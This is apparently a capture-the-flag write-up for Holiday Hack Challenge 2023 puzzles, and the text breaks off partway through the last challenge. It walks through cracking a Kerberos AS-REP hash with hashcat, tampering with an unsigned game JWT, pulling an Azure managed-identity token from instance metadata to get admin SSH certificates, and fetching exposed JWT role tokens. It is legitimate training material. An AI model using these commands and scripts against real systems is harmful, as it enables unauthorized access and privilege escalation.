## hashcat <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys and take a crack at it!

<!-- report-keep -->

### Useful AI Prompts

- How do I use Hashcat to solve a hashed password using a word list?

### Approach

I first simply logged into the terminal to see what I have to work with:

<!-- report-keep -->

```console
elf@a2f91bdb995f:~$ ls
HELP  hash.txt  password_list.txt
elf@a2f91bdb995f:~$ cat hash.txt
$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966elf@a2f91bdb995f:~$ 
elf@a2f91bdb995f:~$ 
```

Looking at the hash, and referencing [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes), I recognize this hash as type kerberos 5 etype 23 as-rep (18200).

I simply return to the terminal and run hashcat against it since we have a password_list.txt:

```console
hashcat -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 -m 18200 -o crackedpassword.txt hash.txt password_list.txt --force
```

After a few moments, I have the password:

```console
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU @ 2.80GHz, 8192/30063 MB allocatable, 8MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=16 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=18200 -D _unroll'
* Device #1: Kernel m18200_a0-pure.d7bc3268.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: password_list.txt
* Passwords.: 144
* Bytes.....: 2776
* Keyspace..: 144
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2...dd1966
Time.Started.....: Tue Dec 12 01:57:52 2023 (0 secs)
Time.Estimated...: Tue Dec 12 01:57:52 2023 (0 secs)
Guess.Base.......: File (password_list.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1137 H/s (0.82ms) @ Accel:1 Loops:1 Thr:64 Vec:16
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 144/144 (100.00%)
Rejected.........: 0/144 (0.00%)
Restore.Point....: 0/144 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-0
Candidates.#1....: 1LuvCandyC4n3s!2022 -> iLuvC4ndyC4n3s!23!

Started: Tue Dec 12 01:57:33 2023
Stopped: Tue Dec 12 01:57:53 2023
elf@a2f91bdb995f:~$ ls
HELP  crackedpassword.txt  hash.txt  password_list.txt
elf@a2f91bdb995f:~$ cat crackedpassword.txt 
$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:IluvC4ndyC4nes!
elf@a2f91bdb995f:~$
```

Now I simply navigate to /bin and execute runtoanswer:

```console
elf@a2f91bdb995f:~$ cd /bin
elf@a2f91bdb995f:/bin$ runtoanswer
What is the password for the hash in /home/elf/hash.txt ?

> IluvC4ndyC4nes!
Your answer: IluvC4ndyC4nes!

Checking....
Your answer is correct!


elf@a2f91bdb995f:/bin$ 
```

### Resources

[hashcat](https://hashcat.net/)

[hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

---

<!-- report-keep -->

## elf-hunt <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75 points.

<!-- report-keep -->

### Useful AI Prompts

- What is inclueded in a JWT token?

### Approach

This is too easy - no need to mess with the JWT.  When the game starts, right click and select inspect. In the console, type:

```console
score = 100
```

When completed, I recieved a copy of the Captain's journal.

### Alternate approach

Okay fine - you want to modify the JWT.  Opening up developer tools, and going to Application -> Cookies, I find a cookie named ElfHunt_JWT.  Looking at the value:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwMH0.
```

There is something missing.  The JWT should have three parts separated by a "." - the Header, payload and signature. If we look at the JWT above, we can see there is a header and payload, but no signature.

You can modify the JWT token (and therefor it's payload) because it is not signed and therefor the game is not validating the signature.  In the payload, speed is set to -500 but you can set it to anything using [https://jwt.io](https://jwt.io) and then pasting the encoded cookie back to your browser.

### Resources

[JWT Dev](https://jwt.io)

[PortSwigger's JWT Guide](https://portswigger.net/web-security/jwt)

---

<!-- report-keep -->

## certificate-sshenanigans <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure Function App. What type of cookie cache is Alabaster planning to implement? To solve this challenge, I need to retrieve Alabaster Snowball's TODO list. This is likely in the SSH server's filesystem somewhere.

<!-- report-keep -->

### Useful AI Prompts

- How do I generate an SSH keypair on windows using RSA and a UPN?
- How do I sign into a server using SSH and a signed cert on windows?
- How can I get a token for Azure API from an Azure Linux virtual machine?

### Approach

This one is interesting, and has multiple layers.  I began by reading between the lines to Alabaster Snowball's talk, which included something about checking out his new ssh server using monitor. To begin, I created a keypair (on windows) by issing the following command:

```console
ssh-keygen -t rsa -C "monitor@santaworkshopgeeseislands.org"
```

Next, I took the public key file that was generated (.pub) and copied the contents and pasted them into Alabaster Snowball's [Azure Function App](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl)
If successful, the app will return a json object with both the ssh_cert and principal.  I copied ssh_cert value and pasted it into a file called signed-cert.pub the directory with my generated keypair from above. This is the file that will be used along with the private key to ssh into Alabaster's ssh server: ssh-server-vm.santaworkshopgeeseislands.org.
Once complete, to ssh into the server, opened a command prompt and navigated to the directory with the cert.

Be sure to use both the signed cert you received from the Azure Function App and your private key generated earlier:

```console
cd %USERPROFILE%\.ssh
ssh -i signed-cert.pub -i id_rsa monitor@ssh-server-vm.santaworkshopgeeseislands.org
```

Once into the server, I found myself at a sattelite tracking interface:

```console
┌──────────────── Satellite Tracking Interface ────────────────┐
│            ____     __ ______             __                 │
│           / __/__ _/ //_  __/______ _____/ /__ ____          │
│          _\ \/ _ `/ __// / / __/ _ `/ __/  '_// __/          │
│         /___/\_,_/\__//_/ /_/  \_,_/\__/_\_\/_/              │
│                                                              │
╞══════════════════════════════════════════════════════════════╡
│                                                              │
│  Position: 1.145128°, -145.261638°                           │
│  Velocity: 3.0701 km/s                                       │
│  Altitude: 35786.09 km above Earth's surface                 │
│  Signal Strength: 95.00%                                     │
│  Solar Panel Status: Deployed                                │
│  Battery Status: Unknown                                     │
│  Thermal Status: Unknown                                     │
│                                                              │
│          **** Geostationary orbit detected! ****             │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

By simply entering <kbd>Ctrl</kbd>-<kbd>c</kbd>, I was able to exit into the terminal.  Once here, I dug around a bit using the usual survey commands to see whether I could (or even needed to) escalate privs. One of the interesting files I came across was in the auth_principals folder of the ssh directory:

```console
monitor@ssh-server-vm:/$ cd /etc/ssh/
monitor@ssh-server-vm:/etc/ssh$ ls
auth_principals  ssh_config            ssh_host_ed25519_key-cert.pub  ssh_host_rsa_key-cert.pub  sshd_config.d
ca.pub           ssh_config.d          ssh_host_ed25519_key.pub       ssh_host_rsa_key.pub
moduli           ssh_host_ed25519_key  ssh_host_rsa_key               sshd_config
monitor@ssh-server-vm:/etc/ssh$ cd auth_principals/
monitor@ssh-server-vm:/etc/ssh/auth_principals$ ls
alabaster  monitor
monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat monitor
elf
monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat alabaster
admin
monitor@ssh-server-vm:/etc/ssh/auth_principals$
```

Looking at this, it is evident that even if I create a certificate for `alabaster@ssh-server-vm.santaworkshopgeeseislands.org`, I won't be able to authorize due to alabaster user only able to auth to ssh with the admin principal. The Azure Function App seems to automatically give the elf principal, although now that has me curious as to how it chooses to do so. I think it's time to see if I can find the source code for the Azure Function App.
To start, I suspect this server might be an Azure VM and if so, there are some things I can do to interact with the Azure API.  Starting with the Azure Instance Metadata service, because it is only accessible from an Azure VM and doesn't require a token to authenticate the way the standard API does. I begin with the following api using curl:

```console
curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
```

What's returned is the following json object.

```json
{
  "compute": {
    "azEnvironment": "AzurePublicCloud",
    "customData": "",
    "evictionPolicy": "",
    "isHostCompatibilityLayerVm": "false",
    "licenseType": "",
    "location": "eastus",
    "name": "ssh-server-vm",
    "offer": "",
    "osProfile": {
      "adminUsername": "",
      "computerName": "",
      "disablePasswordAuthentication": ""
    },
    "osType": "Linux",
    "placementGroupId": "",
    "plan": {
      "name": "",
      "product": "",
      "publisher": ""
    },
    "platformFaultDomain": "0",
    "platformUpdateDomain": "0",
    "priority": "",
    "provider": "Microsoft.Compute",
    "publicKeys": [],
    "publisher": "",
    "resourceGroupName": "northpole-rg1",
    "resourceId": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines/ssh-server-vm",
    "securityProfile": {
      "secureBootEnabled": "false",
      "virtualTpmEnabled": "false"
    },
    "sku": "",
    "storageProfile": {
      "dataDisks": [],
      "imageReference": {
        "id": "",
        "offer": "",
        "publisher": "",
        "sku": "",
        "version": ""
      },
      "osDisk": {
        "caching": "ReadWrite",
        "createOption": "Attach",
        "diffDiskSettings": {
          "option": ""
        },
        "diskSizeGB": "30",
        "encryptionSettings": {
          "enabled": "false"
        },
        "image": {
          "uri": ""
        },
        "managedDisk": {
          "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/disks/ssh-server-vm_os_disk",
          "storageAccountType": "Standard_LRS"
        },
        "name": "ssh-server-vm_os_disk",
        "osType": "Linux",
        "vhd": {
          "uri": ""
        },
        "writeAcceleratorEnabled": "false"
      },
      "resourceDisk": {
        "size": "63488"
      }
    },
    "subscriptionId": "2b0942f3-9bca-484b-a508-abdae2db5e64",
    "tags": "Project:HHC23",
    "tagsList": [
      {
        "name": "Project",
        "value": "HHC23"
      }
    ],
    "userData": "",
    "version": "",
    "vmId": "1f943876-80c5-4fc2-9a77-9011b0096c78",
    "vmScaleSetName": "",
    "vmSize": "Standard_B4ms",
    "zone": ""
  },
  "network": {
    "interface": [
      {
        "ipv4": {
          "ipAddress": [
            {
              "privateIpAddress": "10.0.0.50",
              "publicIpAddress": ""
            }
          ],
          "subnet": [
            {
              "address": "10.0.0.0",
              "prefix": "24"
            }
          ]
        },
        "ipv6": {
          "ipAddress": []
        },
        "macAddress": "6045BDFE2D67"
      }
    ]
  }
}
```

This now allows me to begin additional api calls now that I know the Subscription and Resource Group I have.  In order to hit standard APIs, I will need to generate a token.  To do so, I can actually get a token from the same endpoint in the Azure Instance Metadata Service because this machine is authenticated to the Azure service:

```console
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
```

This will return a json object with the access token:

```json
{"access_token":"eyJ0eXAi...","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85901","expires_on":"1702429034","ext_expires_in":"86399","not_before":"1702342334","resource":"https://management.azure.com/","token_type":"Bearer"}
```

Using that token, and the SubscriptionID, Resource Group and Function App Name, I now hit the source controls Azure API with the token in the header: `https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01`
I'm going to store the results in output.json in the monitor's home directory:

```console
cd /home/monitor
curl "`https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01`" -H "Authorization:Bearer eyJ0eXAi..." -H "Content-Type:application/json" -o output.json -D - -s
cat output.json
```

In the output, I see some interesting things:

```json
{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web","name":"northpole-ssh-certs-fa","type":"Microsoft.Web/sites/sourcecontrols","location":"East US","tags":{"project":"northpole-ssh-certs","create-cert-func-url-path":"/api/create-cert?code=candy-cane-twirl"},"properties":{"repoUrl":"https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa","branch":"main","isManualIntegration":false,"isGitHubAction":true,"deploymentRollbackEnabled":false,"isMercurial":false,"provisioningState":"Succeeded","gitHubActionConfiguration":{"codeConfiguration":null,"containerConfiguration":null,"isLinux":true,"generateWorkflowFile":true,"workflowSettings":{"appType":"functionapp","publishType":"code","os":"linux","variables":{"runtimeVersion":"3.11"},"runtimeStack":"python","workflowApiVersion":"2020-12-01","useCanaryFusionServer":false,"authType":"publishprofile"}}}}
```

Most notably: "repoUrl":"`https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa`","branch":"main"
Navigating to [https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa](https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa) gives me full access to the sourcecode. I first review function_app.py

<!-- report-keep -->

Most notably in that source code, this line is intriguing based on what I have found so far:

```python
principal = data.get("principal", DEFAULT_PRINCIPAL)
```

If I adjust my post message to the Request SSH Certificate Azure App, I should be able to get a signed certificate with admin as the principal. I will use powershell for that, but first I need to create a new keypair for the user `alabaster@santaworkshopgeeseislands.org`, and save those public and private keys to the same ssh directory as I did for monitor.

```console
ssh-keygen -t rsa -C "alabaster@santaworkshopgeeseislands.org"
```

Now that I have the keypair generated, I can pivot to powershell and use that public key to request a certificate through Invoke-WebRequest while also passing the Principal property in the Post body:

```powershell
$uri = "https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl"

$body = @{
    #copy the contents of your generated public key here
    'ssh_pub_key' = 'ssh-rsa AAAAB3Nc....nr0gVLiRm9Of028= alabaster@santaworkshopgeeseislands.org'
    'principal' = 'admin'
    }

$body = $body | ConvertTo-Json

$content = Invoke-WebRequest -Uri $uri -Method POST -Body $body
$content.Content
```

And we are there! The PowerShell comes back with something like:

```json
{"ssh_cert": "rsa-sha2-512-cert-v01@openssh.com AAAA...EzD/h2py3QA= ", "princip
al": "admin"}
```

I now have a certificate that I can save to my SSH folder that will allow me to SSH as Alabaster with the principal admin! I saved the above output of the ssh_cert value to my ssh folder as al_signed-cert.pub and my private key al_id_rsa generated earlier is in the same folder.
Back to a console on my Windows machine, I'm able to successfully SSH as alabaster:

```console
ssh -tt -i al_signed-cert.pub -i al_id_rsa alabaster@ssh-server-vm.santaworkshopgeeseislands.org
alabaster@ssh-server-vm:~$ ls
alabaster_todo.md  impacket
alabaster@ssh-server-vm:~$ cat alabaster_todo.md
## Geese Islands IT & Security Todo List

- [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
```

All that's left, is to go back to the objective and answer the question based on the TODO list :)

### Resources

[Azure Function App](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl)

[talk and demo](https://youtu.be/4S0Rniyidt4)

[get-source-control](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control)

[Azure REST API](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)

---

<!-- report-keep -->

## captains-coms <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Speak with Chimney Scissorsticks on Steampunk Island about the interesting things the captain is hearing on his new Software Defined Radio. You'll need to assume the GeeseIslandsSuperChiefCommunicationsOfficer role.

<!-- report-keep -->

### Useful AI Prompts

- Give me a short tutorial on using burpsuite with JWTs.
- How do I sign a JWT using burpsuite?

### Approach

I spun my wheels on this initially, but then reread the owners card and captain's notes.  The owner's card states that "the 'rMonitor.tok' file containing the 'radioMonitor' role token was created in the '/jwtDefault' directory. Initially I was thinking I'm missing some console or something to navigate a filesystem. But we can navigate this directory with a web request so simply modifying the get request to point to that .tok path allwed me to get the RadioMonitor token. I did this in PowerShell:

```powershell
#access token taken from current radioUser justWatchThisRole cookie
$accessToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg'

$headers = @{
"Authorization" = "Bearer $accessToken"
"Content-Type" = "application/json"
}

$uri = "https://captainscomms.com/jwtDefault/rMonitor.tok"
$result = Invoke-WebRequest -Uri $uri -Headers $headers
$content = $result.content
Write-Output $content
```

```
GET /jwtDefault/rMonitor.tok
RadioMonitor token:
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg
```

Using the same approach, I read through the captain's ChatNPT Initial To-Do list once more and he mentions a status that "I moved the private key to a folder I hope no one will find.  I created a 'keys' folder in the same directory the 'roleMonitor' token is in and put the public key 'capsPubKey.key' there. So I am able to get the public key:

```powershell
#access token taken from current radioUser justWatchThisRole cookie
$accessToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg'

$headers = @{
"Authorization" = "Bearer $accessToken"
"Content-Type" = "application/json"
}

$uri = "https://captainscomms.com/jwtDefault/keys/capsPubKey.key"
$result = Invoke-WebRequest -Uri $uri -Headers $headers
$content = $result.content
Write-Output $content
```

```
GET /jwtDefault/keys/capsPubKey.key
capsPubKey.key:
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJZuLJVB4EftUOQN1Auw
VzJyr1Ma4xFo6EsEzrkprnQcdgwz2iMM76IEiH8FlgKZG1U0RU4N3suI24NJsb5w
J327IYXAuOLBLzIN65nQhJ9wBPR7Wd4Eoo2wJP2m2HKwkW5Yadj6T2YgwZLmod3q
n6JlhN03DOk1biNuLDyWao+MPmg2RcxDR2PRnfBartzw0HPB1yC2Sp33eDGkpIXa2023
cx/lGVHFVxE1ptXP+asOAzK1wEezyDjyUxZcMMmV0VibzeXbxsXYvV3knScr2WYO
qZ5ssa4Rah9sWnm0CKG638/lVD9kwbvcO2lMlUeTp7vwOTXEGyadpB0WsuIKuPH6
uQIDAQAB
-----END PUBLIC KEY-----
```

Next, I checked if there is a radio decoder token exposed using the same method, except in the headers I now use the **radioMonitor** token aquired above:

```powershell
#access token for radioMonitor obtained earlier
$accessToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg'

$headers = @{
"Authorization" = "Bearer $accessToken"
"Content-Type" = "application/json"
}

$uri = "https://captainscomms.com/jwtDefault/rDecoder.tok"
$result = Invoke-WebRequest -Uri $uri -Headers $headers
$content = $result.content
Write-Output $content
```

```
GET /jwtDefault/rDecoder.tok
RadioDecoder token:
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg
```

NICE! Now able to get to work with the radioDecoder role on the SDR by entering the above toek into the value of my justWatchThisRole cookie.

Clicking on the SDR and the left signal as radioDecoder:

```
. . . CQ CQ DE KH644 -- SILLY CAPTAIN! WE FOUND HIS FANCY RADIO PRIVATE KEY IN A FOLDER CALLED TH3CAPSPR1V4T3F0LD3R . . .
```

Clicking on the SDR and the center signal as radioDecoder:

